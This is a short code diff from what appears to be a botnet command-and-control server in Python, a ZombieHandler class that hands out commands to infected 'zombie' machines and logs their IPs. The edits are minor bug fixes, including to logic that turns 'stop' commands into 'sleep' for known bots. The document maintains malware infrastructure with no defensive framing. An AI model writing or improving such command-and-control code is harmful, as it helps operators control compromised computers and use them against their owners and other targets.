@@ -47,7 +47,7 @@ class ZombieHandler(BaseHTTPRequestHandler):
                 		if 'stop' in commands and client_ip in bots:
                     			commands = commands.replace('stop', 'sleep')
                 		commands_json = json.loads(commands)
-                		data = json.dumps({'commands': commands_json})
+                		data = json.dumps({"commands": commands_json})
                 		self.send_response(200)
                 		self.end_headers()
                 		self.wfile.write(data.encode())
@@ -62,7 +62,7 @@ class ZombieHandler(BaseHTTPRequestHandler):
                 			if client_ip in current_zombies:
                     				ind = current_zombies.index(client_ip)
                     				zombies[ind]['last_seen'] = time.time()
-                    				zombies[ind]['command'] = commands
+                    				zombies[ind]['command'] = commands_json
                 			else:
                     				zombies.append({"ip": client_ip, "command": commands_json, "last_seen": time.time()})
             				with open('zombies.txt', 'w') as f:
